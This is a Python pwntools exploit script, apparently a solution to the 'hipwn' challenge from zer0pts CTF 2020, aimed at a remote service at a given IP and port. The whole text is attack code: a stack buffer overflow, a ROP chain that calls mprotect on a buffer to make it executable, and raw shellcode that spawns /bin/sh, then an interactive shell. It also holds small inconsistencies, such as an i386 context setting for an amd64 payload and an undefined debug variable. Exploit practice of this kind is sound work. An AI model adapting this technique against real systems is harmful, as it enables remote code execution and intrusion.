from pwn import *


pwnable = './hipwn'

elf = ELF(pwnable)

context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'i386')

context.log_level = 'DEBUG'

debug_set = '''
    b *0x40019c
'''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    #p = process("./seethefile", env=env)
    #gdb.attach(p, debug_set_1)
    p = process(pwnable)
    gdb.attach(p, debug_set)
else:
    #p = process('./seethefile')
    #env = {"LD_PRELOAD": os.path.join(os.getcwd(), "/root/libc_32.so.6")}  nc 13.231.207.73 9010
    #p = process(pwnable)
    p = remote('13.231.207.73', 9010)

p.recvuntil("name?")

#p.sendline("A"*264 + p64(0x00402e67) + '/bin//sh' + p64(0x00402db8) + p64(0x0) + p64(0x00402d32) + p64(0x0))

#shellcode = pwnlib.shellcraft.amd64.linux.readfile('/home/pwn/flag', dst='rdi')
#shellcode += shellcraft.amd64.linux.write(1, 'rdi', 32)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = p64(0x00402a30) #xor eax, eax
payload += p64(0x00402db8) #pop rdx
payload += p64(0x5) #add this to edx to get 0xa
payload += p64(0x00402345) #add edx, edx -> edx=0xa
payload += p64(0x00402069) #mov    eax, edx
payload += p64(0x0) #garbage for pop    rbx in 0x00402069 gadget
payload += p64(0x0040141c) #pop rdi
payload += p64(0x603000) #buffer to mark executable
payload += p64(0x00402d32) #pop rsi
payload += p64(0x100) #size
payload += p64(0x0) #garbage for pop    r15 in 0x00402d32 gadget
payload += p64(0x00402db8) #pop rdx
payload += p64(0x7) #permissions 
payload += p64(0x00402ea1) #syscall
payload += p64(0x00402a30) #xor eax, eax
payload += p64(0x0040141c) #pop rdi
payload += p64(0x0) #STDIN
payload += p64(0x00402d32) #pop rsi
payload += p64(0x603000) #executable buffer
payload += p64(0x0) #garbage for pop    r15 in 0x00402d32 gadget
payload += p64(0x00402db8) #pop rdx
payload += p64(0x100) #size
payload += p64(0x00402ea1) #syscall
payload += p64(0x603000) #return to shellcode

p.sendline("A"*264 + payload)

p.recvline()
#p.recvuntil("Welcome to zer0pts CTF 2020!\n")
p.sendline(shellcode)


#p.wait_for_close()
p.interactive()

